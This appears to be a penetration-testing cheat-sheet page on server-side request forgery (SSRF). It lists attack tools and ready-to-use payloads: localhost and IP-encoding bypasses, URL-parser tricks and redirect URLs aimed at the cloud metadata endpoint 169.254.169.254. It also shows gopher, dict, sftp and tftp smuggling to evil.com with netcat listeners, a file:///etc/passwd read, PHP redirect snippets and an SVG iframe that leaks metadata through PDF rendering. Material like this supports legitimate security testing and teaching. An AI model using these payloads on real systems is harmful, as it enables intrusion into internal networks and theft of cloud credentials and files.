# SSRF

## Tools

```bash
# https://github.com/tarunkant/Gopherus
gopherus --exploit [PLATFORM]
# https://github.com/daeken/SSRFTest
# https://github.com/jmdx/TLS-poison/
# https://github.com/m4ll0k/Bug-Bounty-Toolz
# https://github.com/cujanovic/SSRF-Testing
# https://github.com/bcoles/ssrf_proxy

gau domain.com | python3 ssrf.py collab.listener.com

# https://github.com/micha3lb3n/SSRFire
./ssrfire.sh -d domain.com -s yourserver.com -f /path/to/copied_raw_urls.txt

# SSRF Redirect Payload generator
# https://tools.intigriti.io/redirector/
```

## Summary

{% hint style="info" %}
Server-side request forgery \(also known as SSRF\) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization's infrastructure, or to external third-party systems.
{% endhint %}

```bash
# Web requesting other ip or ports like 127.0.0.1:8080 or 192.168.0.1
chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:3000
GET /ssrf?user=&comment=&link=http://127.0.0.1:3000 HTTP/1.1
```

## SSRF Attacks

```bash
# Check if you're able to enum IP or ports
127.0.0.1
127.0.1
127.1
127.000.000.001
2130706433
0x7F.0x00.0x00.0x01
0x7F.1
0x7F000001

# Quick URL based bypasses:
http://google.com:80+&@127.88.23.245:22/#+@google.com:80/
http://127.88.23.245:22/+&@google.com:80#+@google.com:80/
http://google.com:80+&@google.com:80#+@127.88.23.245:22/
http://127.88.23.245:22/?@google.com:80/
http://127.88.23.245:22/#@www.google.com:80/

# 301 responses:
https://ssrf.localdomain.pw/img-without-body/301-http-169.254.169.254:80-.i.jpg
https://ssrf.localdomain.pw/img-without-body-md/301-http-.i.jpg
https://ssrf.localdomain.pw/img-with-body/301-http-169.254.169.254:80-.i.jpg
https://ssrf.localdomain.pw/img-with-body-md/301-http-.i.jpg

# 301 json:
https://ssrf.localdomain.pw/json-without-body/301-http-169.254.169.254:80-.j.json
https://ssrf.localdomain.pw/json-without-body-md/301-http-.j.json
https://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254:80-.j.json
https://ssrf.localdomain.pw/json-with-body-md/301-http-.j.json

# 301 csv:
https://ssrf.localdomain.pw/csv-without-body/301-http-169.254.169.254:80-.c.csv
https://ssrf.localdomain.pw/csv-without-body-md/301-http-.c.csv
https://ssrf.localdomain.pw/csv-with-body/301-http-169.254.169.254:80-.c.csv
https://ssrf.localdomain.pw/csv-with-body-md/301-http-.c.csv

# 301 xml:
https://ssrf.localdomain.pw/xml-without-body/301-http-169.254.169.254:80-.x.xml
https://ssrf.localdomain.pw/xml-without-body-md/301-http-.x.xml
https://ssrf.localdomain.pw/xml-with-body/301-http-169.254.169.254:80-.x.xml
https://ssrf.localdomain.pw/xml-with-body-md/301-http-.x.xml

# 301 pdf:
https://ssrf.localdomain.pw/pdf-without-body/301-http-169.254.169.254:80-.p.pdf
https://ssrf.localdomain.pw/pdf-without-body-md/301-http-.p.pdf
https://ssrf.localdomain.pw/pdf-with-body/301-http-169.254.169.254:80-.p.pdf
https://ssrf.localdomain.pw/pdf-with-body-md/301-http-.p.pdf

# 30x custom:
https://ssrf.localdomain.pw/custom-30x/?code=332&url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json

# 20x custom:
https://ssrf.localdomain.pw/custom-200/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json

# 201 custom:
https://ssrf.localdomain.pw/custom-201/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json

# HTML iframe + URL bypass
http://ssrf.localdomain.pw/iframe/?proto=http&ip=127.0.0.1&port=80&url=/

# SFTP
http://whatever.com/ssrf.php?url=sftp://evil.com:11111/

evil.com:$ nc -v -l 11111
Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)
SSH-2.0-libssh2_1.4.2

# Dict
http://safebuff.com/ssrf.php?dict://attacker:11111/

evil.com:$ nc -v -l 11111
Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)
CLIENT libcurl 7.40.0

# gopher
# http://safebuff.com/ssrf.php?url=http://evil.com/gopher.php
<?php
        header('Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest');
?>

evil.com:# nc -v -l 12346
Listening on [0.0.0.0] (family 0, port 12346)
Connection from [192.168.0.10] port 12346 [tcp/*] accepted (family 2, sport 49398)
HI
Multiline
test

# TFTP
# http://safebuff.com/ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET

evil.com:# nc -v -u -l 12346
Listening on [0.0.0.0] (family 0, port 12346)
TESTUDPPACKEToctettsize0blksize512timeout6

# file
http://safebuff.com/redirect.php?url=file:///etc/passwd

# ldap
http://safebuff.com/redirect.php?url=ldap://localhost:11211/%0astats%0aquit

# SSRF Bypasses
?url=http://safesite.com&site.com
?url=http://////////////site.com/
?url=http://site@com/account/edit.aspx
?url=http://site.com/account/edit.aspx
?url=http://safesite.com?.site.com
?url=http://safesite.com#.site.com
?url=http://safesite.com\.site.com/domain
?url=https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
?url=https://192.10.10.3/
?url=https://192.10.10.2?.192.10.10.3/
?url=https://192.10.10.2#.192.10.10.3/
?url=https://192.10.10.2\.192.10.10.3/
?url=http://127.0.0.1/status/
?url=http://localhost:8000/status/
?url=http://site.com/domain.php
<?php
header(‘Location: http://127.0.0.1:8080/status');
?>

# Localhost bypasses
0
127.00.1
127.0.01
0.00.0
0.0.00
127.1.0.1
127.10.1
127.1.01
0177.1
0177.0001.0001
0x0.0x0.0x0.0x0
0000.0000.0000.0000
0x7f.0x0.0x0.0x1
0177.0000.0000.0001
0177.0001.0000..0001
0x7f.0x1.0x0.0x1
0x7f.0x1.0x1

# Blind SSRF
- Review Forms
- Contact Us
- Password fields
- Contact or profile info (Names, Addresses)
- User Agent

# SSRF through video upload
# https://hackerone.com/reports/1062888
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS

# SSRF in pdf rendering
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="highcharts-root" width="800" height="500">
    <g>
        <foreignObject width="800" height="500">
            <body xmlns="http://www.w3.org/1999/xhtml">
                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
            </body>
        </foreignObject>
    </g>
</svg>
```

SSRF Bypasses

```bash
http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
http://%73%68%6d%69%6c%6f%6e%2e%63%6f%6d
http://////////////site.com/
http://0000::1:80/
http://000330.0000072.0000326.00000343
http://000NaN.000NaN
http://0177.00.00.01
http://017700000001
http://0330.072.0326.0343
http://033016553343
http://0NaN
http://0NaN.0NaN
http://0x0NaN0NaN
http://0x7f000001/
http://0xd8.0x3a.0xd6.0xe3
http://0xd8.0x3a.0xd6e3
http://0xd8.0x3ad6e3
http://0xd83ad6e3
http://0xNaN.0xaN0NaN
http://0xNaN.0xNa0x0NaN
http://0xNaN.0xNaN
http://127.0.0.1/status/
http://127.1/
http://2130706433/
http://216.0x3a.00000000326.0xe3
http://3627734755
http://[::]:80/
http://localhost:8000/status/
http://NaN
http://safesite.com#.site.com
http://safesite.com&site.com
http://safesite.com?.site.com
http://safesite.com\.site.com/domain
http://shmilon.0xNaN.undefined.undefined
http://site.com/account/edit.aspx
http://site.com/domain.php
http://site@com/account/edit.aspx
http://whitelisted@127.0.0.1
https://192.10.10.2#.192.10.10.3/
https://192.10.10.2?.192.10.10.3/
https://192.10.10.2\.192.10.10.3/
https://192.10.10.3/
https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
<?php
header('Location: http://127.0.0.1:8080/status');
?>

# Tool
# https://h.43z.one/ipconverter/
```

## Mindmap

![](../../.gitbook/assets/image%20%2826%29.png)

